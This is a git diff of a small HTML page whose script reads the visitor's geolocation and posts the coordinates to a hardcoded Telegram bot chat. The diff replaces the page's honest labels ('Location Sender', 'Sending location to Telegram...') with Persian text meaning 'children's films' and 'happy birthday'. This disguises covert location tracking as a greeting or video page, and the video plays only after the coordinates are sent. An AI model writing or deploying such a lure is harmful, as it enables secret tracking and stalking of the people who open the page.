@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Location Sender</title>
+  <title>فلم های کودکان</title>
   <style>
     body {
       font-family: sans-serif;
@@ -19,7 +19,7 @@
   </style>
 </head>
 <body>
-  <h2>📍 Sending your location...</h2>
+  <h2> تولد شما مبارک...</h2>
   <p id="status">Please wait...</p>
 
   <video id="myVideo" controls>
@@ -46,7 +46,7 @@
           const chatId = '7570861617';
           const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
 
-          status.innerText = "📡 Sending location to Telegram...";
+          status.innerText = "📡 تولد شما مبارک...";
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
@@ -61,7 +61,7 @@
           .then(response => response.json())
           .then(data => {
             if (data.ok) {
-              status.innerText = "✅ Location sent successfully!";
+              status.innerText = "✅ تولد شما مبارک!";
               video.style.display = "block";
               video.play();
             } else {
